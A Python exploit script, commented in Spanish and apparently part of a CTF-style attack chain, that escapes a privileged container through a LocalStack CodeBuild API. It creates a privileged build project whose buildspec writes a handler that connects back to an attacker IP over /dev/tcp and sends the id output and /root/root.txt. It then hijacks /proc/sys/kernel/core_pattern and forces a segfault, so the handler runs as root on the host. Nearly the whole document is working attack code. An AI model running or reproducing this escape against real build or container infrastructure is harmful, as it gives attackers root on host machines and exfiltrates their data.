#!/usr/bin/env python3
"""
Escape de contenedor privilegiado via AWS CodeBuild (LocalStack) + core_pattern

Segunda etapa de la cadena: una vez con acceso a una API de AWS tipo LocalStack
que expone CodeBuild, se crea un proyecto con `privilegedMode: True` y se abusa
de `/proc/sys/kernel/core_pattern` para ejecutar un binario propio en el host
cuando un proceso crashea (SIGSEGV). Resultado: ejecucion como root en el host
que corre el contenedor.

Uso:
    python3 codebuild-core-pattern-escape.py \
        --endpoint http://LOCALSTACK_HOST:4566 \
        --lhost ATACANTE_IP --lport 9000
"""
import argparse

import boto3


def main():
    ap = argparse.ArgumentParser(description="CodeBuild privileged core_pattern host escape")
    ap.add_argument("--endpoint", required=True,
                    help="endpoint de la API AWS/LocalStack, ej http://host:4566")
    ap.add_argument("--region", default="us-east-1")
    ap.add_argument("--akid", default="test", help="aws_access_key_id (LocalStack: test)")
    ap.add_argument("--secret", default="test", help="aws_secret_access_key (LocalStack: test)")
    ap.add_argument("--image", default="alpine:latest", help="imagen del contenedor de build")
    ap.add_argument("--role", default="arn:aws:iam::000000000000:role/codebuild",
                    help="serviceRole ARN (placeholder por defecto)")
    ap.add_argument("--lhost", required=True, help="IP de tu listener")
    ap.add_argument("--lport", default="9000", help="puerto de tu listener (default 9000)")
    ap.add_argument("--name", default="pwn", help="nombre del proyecto CodeBuild")
    args = ap.parse_args()

    cb = boto3.client("codebuild", endpoint_url=args.endpoint, region_name=args.region,
                      aws_access_key_id=args.akid, aws_secret_access_key=args.secret)

    # buildspec: escribe un handler de core_pattern que hace un callback como root
    buildspec = (
        "version: 0.2\n"
        "phases:\n"
        "  build:\n"
        "    commands:\n"
        "      - id; UP=$(grep -o 'upperdir=[^,]*' /proc/self/mountinfo | head -1 | cut -d= -f2); echo UP=$UP\n"
        "      - printf '#!/bin/bash\\nexec 3<>/dev/tcp/%s/%s\\necho ROOT $(id) $(cat /root/root.txt 2>/dev/null) >&3\\n' > /pwn; chmod +x /pwn; cat /pwn\n"
        "      - echo \"|$UP/pwn\" > /proc/sys/kernel/core_pattern; cat /proc/sys/kernel/core_pattern\n"
        "      - cd /tmp; ulimit -c unlimited; sh -c 'kill -SEGV $$'; sleep 4; echo done\n"
    ) % (args.lhost, args.lport)

    try:
        cb.delete_project(name=args.name)
    except Exception:
        pass

    p = cb.create_project(
        name=args.name,
        source={"type": "NO_SOURCE", "buildspec": buildspec},
        artifacts={"type": "NO_ARTIFACTS"},
        environment={
            "type": "LINUX_CONTAINER",
            "image": args.image,
            "computeType": "BUILD_GENERAL1_SMALL",
            "privilegedMode": True,
        },
        serviceRole=args.role,
    )
    print("[*] proyecto creado:", p.get("project", {}).get("arn"))

    b = cb.start_build(projectName=args.name)
    print("[*] build lanzado:", b.get("build", {}).get("id"))
    print(f"[+] escucha en {args.lhost}:{args.lport} (nc -lvnp {args.lport})")


if __name__ == "__main__":
    main()
